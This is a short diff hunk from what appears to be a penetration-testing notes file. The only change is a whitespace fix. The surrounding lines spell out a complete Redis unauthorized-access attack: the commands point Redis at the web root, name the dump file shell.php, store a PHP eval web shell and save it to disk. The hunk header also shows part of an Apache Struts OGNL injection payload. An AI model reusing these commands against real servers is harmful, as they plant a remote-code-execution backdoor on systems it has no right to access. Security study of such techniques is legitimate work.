@@ -132,7 +132,7 @@ Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_
 redis-cli -h 192.168.121.138
 192.168.121.138:6379>config set dir /var/www/html 
 192.168.121.138:6379>config set dbfilename shell.php 
-192.168.121.138:6379> set shell "\r\n<?php @eval($_POST['1']);?>\r\n
+192.168.121.138:6379>set shell "\r\n<?php @eval($_POST['1']);?>\r\n
 192.168.121.138:6379>save
 ```
 
